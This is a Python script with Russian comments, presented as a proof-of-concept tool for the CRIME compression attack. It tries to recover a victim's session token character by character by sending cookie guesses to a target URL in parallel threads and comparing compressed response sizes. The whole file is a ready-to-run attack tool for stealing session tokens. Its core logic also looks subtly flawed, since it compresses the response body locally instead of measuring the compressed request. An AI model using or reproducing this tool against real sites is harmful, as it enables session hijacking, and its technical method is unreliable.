import requests
import zlib
import argparse
import logging
import concurrent.futures
from typing import Dict, List, Tuple, Optional
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# Настройки логирования
def setup_logging():
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Настройка сессии HTTP-запросов с параметрами повторов
def create_session(retries: int = 3, backoff_factor: float = 0.3) -> requests.Session:
    session = requests.Session()
    retry_strategy = Retry(
        total=retries,
        status_forcelist=[500, 502, 503, 504],
        backoff_factor=backoff_factor,
        method_whitelist=["GET", "POST"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

# Класс для реализации атаки по компрессии токена
class CompressedTokenCracker:

    def __init__(self, target: str, initial_prefix: str, charset: str, custom_headers: Dict[str, str], threads: int, request_timeout: int):
        self.target_url = target
        self.prefix = initial_prefix
        self.charset = charset
        self.headers = custom_headers
        self.max_threads = threads
        self.timeout = request_timeout
        self.session = create_session()  # Создаем сессию с параметрами повтора

    @staticmethod
    # Вычисление размера сжатых данных для заданной строки
    def calculate_compressed_size(data: str) -> int:
        return len(zlib.compress(data.encode()))

    # Попытка угадать следующий символ токена с использованием текущей строки
    def attempt_character(self, character: str, current_token: str) -> Tuple[str, int]:
        guess = current_token + character
        updated_headers = self.headers.copy()
        updated_headers['Cookie'] = guess
        
        try:
            response = self.session.get(self.target_url, headers=updated_headers, timeout=self.timeout)
            compressed_length = self.calculate_compressed_size(response.text)
            logging.debug(f"Проверка варианта '{guess}': длина сжатия = {compressed_length}")
            return character, compressed_length
        except requests.RequestException as e:
            logging.error(f"Ошибка запроса для '{guess}': {e}")
            return character, float('inf')

    # Основной метод атаки для поочередного угадывания токена
    def execute(self) -> str:
        discovered_token = self.prefix

        while True:
            shortest_length = float('inf')
            optimal_character: Optional[str] = None

            with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                future_to_char = {
                    executor.submit(self.attempt_character, char, discovered_token): char
                    for char in self.charset
                }
                for future in concurrent.futures.as_completed(future_to_char):
                    char, compressed_length = future.result()
                    if compressed_length < shortest_length:
                        shortest_length = compressed_length
                        optimal_character = char

            if optimal_character is None:
                # Если не удалось найти ни одного подходящего символа
                break

            discovered_token += optimal_character
            logging.info(f"Текущий токен: {discovered_token}")

            # Прерывание, если найден завершающий символ (например, '=')
            if optimal_character == '=':
                logging.info(f"Обнаружен полный токен сессии: {discovered_token}")
                break

        return discovered_token

# Преобразование списка заголовков в формат словаря
def parse_headers(headers: List[str]) -> Dict[str, str]:
    headers_dict = {}
    for header in headers:
        try:
            key, value = header.split('=', 1)
            headers_dict[key.strip()] = value.strip()
        except ValueError:
            logging.warning(f"Некорректный формат заголовка: {header}")
    return headers_dict

# Настройка парсера аргументов командной строки
def setup_argument_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="PoC для атаки CRIME (Сжатие данных) by geniuszly")
    parser.add_argument('url', help="URL-адрес цели")
    parser.add_argument('prefix', help="Начальный известный префикс для атаки")
    parser.add_argument('--charset', default='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', help="Набор символов для перебора")
    parser.add_argument('--headers', nargs='*', default=[], help="Дополнительные HTTP-заголовки в формате key=value")
    parser.add_argument('--threads', type=int, default=10, help="Количество параллельных потоков")
    parser.add_argument('--timeout', type=int, default=5, help="Таймаут для HTTP-запросов (в секундах)")
    parser.add_argument('--retries', type=int, default=3, help="Количество попыток при ошибках HTTP-запросов")
    parser.add_argument('--output', help="Файл для сохранения найденного значения токена", type=str, default=None)
    return parser

# Сохранение найденного значения токена в файл
def save_result(value: str, output_file: str):
    try:
        with open(output_file, 'w') as file:
            file.write(value)
        logging.info(f"Результат успешно сохранен в файл: {output_file}")
    except IOError as e:
        logging.error(f"Ошибка при записи в файл: {e}")

def main():
    # Настройка логирования
    setup_logging()
    
    # Инициализация парсера и разбор аргументов
    parser = setup_argument_parser()
    args = parser.parse_args()

    # Парсинг заголовков в формат словаря
    parsed_headers = parse_headers(args.headers)

    # Создание экземпляра атакующего
    cracker = CompressedTokenCracker(
        target=args.url,
        initial_prefix=args.prefix,
        charset=args.charset,
        custom_headers=parsed_headers,
        threads=args.threads,
        request_timeout=args.timeout
    )

    # Выполнение атаки и вывод результата
    discovered_value = cracker.execute()

    # Сохранение результата, если указано
    if args.output:
        save_result(discovered_value, args.output)
    else:
        print(f"Найдено значение токена: {discovered_value}")

if __name__ == "__main__":
    main()
